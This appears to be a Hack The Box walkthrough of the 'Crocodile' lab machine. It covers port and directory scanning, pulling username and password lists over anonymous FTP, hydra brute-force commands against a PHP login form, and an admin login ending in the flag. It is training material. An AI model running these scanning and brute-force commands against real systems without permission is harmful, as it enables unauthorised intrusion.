# HTB: Crocodile

### Commands from Demonstration

```
dirb http://10.129.1.15/ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

```
feroxbuster -u "http://10.8.0.222" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --no-recursion -t 100
```

```
hydra 10.129.1.15 -L allowed.userlist -P allowed.userlist.passwd http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Incorrect information" -V
```

```
hydra 10.129.1.15 -L allowed.userlist -P allowed.userlist.passwd http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Incorrect"
```

### Nmap 

#### Nmap Scan Command
```nmap -A -T5 10.129.133.157```

#### Nmap Scan Output
```
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -A -T5 10.129.133.157
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-10 12:23 EDT
Warning: 10.129.133.157 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.133.157
Host is up (0.058s latency).
Not shown: 911 closed tcp ports (conn-refused), 87 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION

| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.119
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds

```

### Ports
#### 21/tcp open  ftp     vsftpd 3.0.3
Anonymous ftp sign in allowed.

Connect using command ```ftp anonymous@10.129.133.157 21```

Access granted without prompting password.
```
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp anonymous@10.129.133.157 21
Connected to 10.129.133.157.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Check current directory using ```ls```
```
ftp> ls
229 Entering Extended Passive Mode (|||47588|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp>
```

First, transfer the allowed.userlist to the local machine by using the ```get allowed.userlist``` command
```
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||45708|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |***********************************************************************|    33      374.72 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.55 KiB/s)
ftp>
```

By opening another terminal on the local machine, it is possible to ```cat``` the contents of the transferred file.
```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat allowed.userlist 
aron
pwnmeow
egotisticalsw
admin
```

"Admin" seems like a user that would have higher privileges than the other accounts.

The same process can be used to obtain and read the "allowed.userlist.passwd" file:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```



#### 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Using gobuster, search for specific file types

```
gobuster dir -u http://10.129.133.157 -w /usr/share/dirb/wordlists/common.txt -x .php
```

*-u indicates a URL, -w specifies a specific wordlist being run, and -x specifies what type(s) of file(s) to search for*

```
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://10.129.133.157 -w /usr/share/dirb/wordlists/common.txt -x .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.133.157
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/assets               (Status: 301) [Size: 317] [--> http://10.129.133.157/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 314] [--> http://10.129.133.157/css/]
/dashboard            (Status: 301) [Size: 320] [--> http://10.129.133.157/dashboard/]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.133.157/fonts/]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 313] [--> http://10.129.133.157/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 279]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
```

Now that the login page has been identified, it is possible to attempt to gain access with the transferred credential files found earlier in the exercise. 

### Attacking with Stolen Credentials

Comparing the two files, there are four entries per document:
```
User                Password
aron                root
pwnmeow             Supersecretpassword1
egotisticalsw       @BaASD&9032123sADS
admin               rKXM59ESxesUFHAd
```

While it would be possible to try all combinations, it would be intuitive to attempt the password that is on the corresponding line of the username. For "admin" the password "rKXM59ESxesUFHAd" will be used.

### Success!!

the flag for this box is:

```c7110277ac44d78b6a9fff2232434d16```